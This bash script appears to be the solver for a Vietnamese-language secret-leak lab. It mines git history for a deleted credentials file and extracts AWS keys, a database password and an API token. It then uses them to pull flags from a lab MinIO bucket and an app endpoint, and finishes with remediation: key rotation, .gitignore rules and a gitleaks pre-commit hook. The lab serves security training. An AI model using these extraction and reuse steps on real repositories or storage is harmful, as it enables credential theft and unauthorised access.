#!/bin/bash
set -u

REPO="$HOME/repo"
SENSITIVE_PATH="deploy/credentials.yaml"
FAIL=0

note() { echo; echo "===== $* ====="; }
ok()   { echo "  [OK] $*"; }
bad()  { echo "  [FAIL] $*"; FAIL=1; }

note "Nhiem vu 1 - recon_history"
if [ ! -d "$REPO/.git" ]; then
  bad "Khong tim thay $REPO — lab chua dung repo (fixlocal.sh chua chay?)."
  exit 1
fi

ADD_COMMIT=$(git -C "$REPO" log --all --diff-filter=A --format='%H' -- "$SENSITIVE_PATH" | tail -n1)
REMOVE_COMMIT=$(git -C "$REPO" log --all --diff-filter=D --format='%H' -- "$SENSITIVE_PATH" | tail -n1)

if [ -n "$ADD_COMMIT" ] && [ -n "$REMOVE_COMMIT" ]; then
  cat > "$HOME/recon_answers.txt" <<EOF
ADD_COMMIT=$ADD_COMMIT
REMOVE_COMMIT=$REMOVE_COMMIT
EOF
  ok "Xac dinh ADD_COMMIT=$ADD_COMMIT REMOVE_COMMIT=$REMOVE_COMMIT -> ~/recon_answers.txt"
else
  bad "Khong xac dinh duoc commit them/xoa $SENSITIVE_PATH"
fi

if git -C "$REPO" show "HEAD:$SENSITIVE_PATH" >/dev/null 2>&1; then
  bad "HEAD van con $SENSITIVE_PATH — repo mau khong dung ky vong"
else
  ok "HEAD hien tai khong con $SENSITIVE_PATH (dung ky vong)"
fi

note "Nhiem vu 2 - scan_secrets"
if command -v gitleaks >/dev/null 2>&1; then
  gitleaks detect --source "$REPO" -v --report-path="$HOME/gitleaks.json" >/tmp/gitleaks_run.log 2>&1
  N=$(grep -c '"RuleID"' "$HOME/gitleaks.json" 2>/dev/null || echo 0)
  if [ "${N:-0}" -ge 3 ]; then
    ok "gitleaks.json co $N finding (>=3)"
  else
    bad "gitleaks.json chi co $N finding (<3) — xem /tmp/gitleaks_run.log"
  fi
else
  bad "khong tim thay lenh gitleaks"
fi

if [ -n "${ADD_COMMIT:-}" ]; then
  CONTENT=$(git -C "$REPO" show "$ADD_COMMIT:$SENSITIVE_PATH" 2>/dev/null)
  AWS_ACCESS_KEY_ID=$(echo "$CONTENT" | sed -n 's/^[[:space:]]*access_key_id:[[:space:]]*//p' | tr -d '\r')
  AWS_SECRET_ACCESS_KEY=$(echo "$CONTENT" | sed -n 's/^[[:space:]]*secret_access_key:[[:space:]]*//p' | tr -d '\r')
  DB_PASSWORD=$(echo "$CONTENT" | sed -n 's/^[[:space:]]*password:[[:space:]]*//p' | tr -d '\r')
  API_TOKEN=$(echo "$CONTENT" | sed -n 's/^[[:space:]]*token:[[:space:]]*//p' | tr -d '\r')

  cat > "$HOME/secrets_found.txt" <<EOF
AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY
DB_PASSWORD=$DB_PASSWORD
API_TOKEN=$API_TOKEN
EOF
  if [ -n "$AWS_ACCESS_KEY_ID" ] && [ -n "$AWS_SECRET_ACCESS_KEY" ] && [ -n "$DB_PASSWORD" ] && [ -n "$API_TOKEN" ]; then
    ok "Trich xuat du 4 credential -> ~/secrets_found.txt"
  else
    bad "Thieu 1 hoac nhieu truong credential khi trich xuat"
  fi
else
  bad "Bo qua trich xuat credential vi khong co ADD_COMMIT"
fi

note "Nhiem vu 3 - exploit_get_flag"
if [ -n "${AWS_ACCESS_KEY_ID:-}" ] && [ -n "${AWS_SECRET_ACCESS_KEY:-}" ]; then
  mc alias set leak "http://storage:9000" "$AWS_ACCESS_KEY_ID" "$AWS_SECRET_ACCESS_KEY" >/dev/null 2>&1
  if mc cat leak/corp-backups/flags/flag.txt > "$HOME/loot_storage.txt" 2>/tmp/mc_cat.log; then
    ok "Lay flag tu MinIO -> ~/loot_storage.txt ($(cat "$HOME/loot_storage.txt"))"
  else
    bad "Khong doc duoc object flag tren MinIO — xem /tmp/mc_cat.log"
  fi
else
  bad "Bo qua huong A (MinIO) vi thieu AWS key"
fi

if [ -n "${API_TOKEN:-}" ]; then
  RESP=$(curl -sS --max-time 10 -H "Authorization: Bearer $API_TOKEN" http://app:8080/flag)
  FLAGVAL=$(echo "$RESP" | jq -r '.flag // empty' 2>/dev/null)
  if [ -n "$FLAGVAL" ]; then
    echo "$FLAGVAL" > "$HOME/loot_api.txt"
    ok "Lay flag tu app (Bearer token) -> ~/loot_api.txt ($FLAGVAL)"
  else
    bad "Khong lay duoc flag tu app qua Bearer token. Phan hoi: $RESP"
  fi
else
  bad "Bo qua huong B (API) vi thieu API_TOKEN"
fi

note "Nhiem vu 4 - remediation_harden"
if [ -x "$HOME/rotate_secrets.sh" ]; then
  "$HOME/rotate_secrets.sh"
  if [ -f "$HOME/loot_rotate.txt" ]; then
    ok "rotate_secrets.sh thanh cong -> ~/loot_rotate.txt ($(cat "$HOME/loot_rotate.txt"))"
  else
    bad "rotate_secrets.sh khong tao duoc ~/loot_rotate.txt"
  fi
else
  bad "Khong tim thay ~/rotate_secrets.sh (hoac khong co quyen thuc thi)"
fi

if [ -n "${AWS_ACCESS_KEY_ID:-}" ] && [ -n "${AWS_SECRET_ACCESS_KEY:-}" ]; then
  mc alias set leak "http://storage:9000" "$AWS_ACCESS_KEY_ID" "$AWS_SECRET_ACCESS_KEY" >/dev/null 2>&1
  mc ls leak > "$HOME/rotate_verify.log" 2>&1
  if [ $? -eq 0 ]; then
    echo "RESULT=ALLOWED" >> "$HOME/rotate_verify.log"
    bad "AWS key cu VAN con truy cap duoc sau rotate (ky vong bi tu choi)"
  else
    echo "RESULT=DENIED" >> "$HOME/rotate_verify.log"
    ok "AWS key cu bi tu choi sau rotate (dung ky vong) -> ~/rotate_verify.log"
  fi
fi

mkdir -p "$REPO"
echo 'APP_API_TOKEN=solver-demo-new-token' > "$REPO/.env"
echo 'AWS_ACCESS_KEY_ID=solver-demo-new-key' >> "$REPO/.env"

cd "$REPO" || exit 1
printf '%s\n' '.env' '*.env' 'config/secrets.*' 'deploy/credentials.yaml' >> .gitignore
if git status --porcelain | grep -q '\.env'; then
  bad ".env van bi Git theo doi sau khi cap nhat .gitignore"
else
  ok ".gitignore chan .env thanh cong"
fi

cat > "$REPO/.git/hooks/pre-commit" <<'HOOK'
#!/bin/sh
gitleaks protect --staged -v || {
  echo "[BLOCKED] Phat hien secret trong thay doi duoc staged. Commit bi huy."
  exit 1
}
HOOK
chmod +x "$REPO/.git/hooks/pre-commit"
if [ -x "$REPO/.git/hooks/pre-commit" ]; then
  ok "pre-commit hook da duoc cai dat va co quyen thuc thi"
else
  bad "khong the chmod +x cho pre-commit hook"
fi

echo 'aws_secret = "AKIAFAKE1234567890EX"' > "$REPO/test_leak.txt"
git -C "$REPO" add test_leak.txt
git -C "$REPO" commit -m "test" > "$HOME/precommit_test.log" 2>&1
if [ $? -ne 0 ]; then
  echo "RESULT=COMMIT_BLOCKED" >> "$HOME/precommit_test.log"
  ok "Pre-commit hook da chan thanh cong commit thu nghiem chua secret"
else
  echo "RESULT=COMMIT_SUCCEEDED" >> "$HOME/precommit_test.log"
  bad "Commit thu nghiem chua secret KHONG bi chan (hook khong hoat dong)"
fi
git -C "$REPO" reset -q HEAD test_leak.txt 2>/dev/null
rm -f "$REPO/test_leak.txt"

note "Tom tat"
if [ "$FAIL" -eq 0 ]; then
  echo "TAT CA BUOC CHINH DA CHAY THANH CONG. Kiem tra lai bang checkwork/gradelab."
  exit 0
else
  echo "CO IT NHAT MOT BUOC THAT BAI O TREN — xem log [FAIL] de debug truoc khi cham."
  exit 1
fi
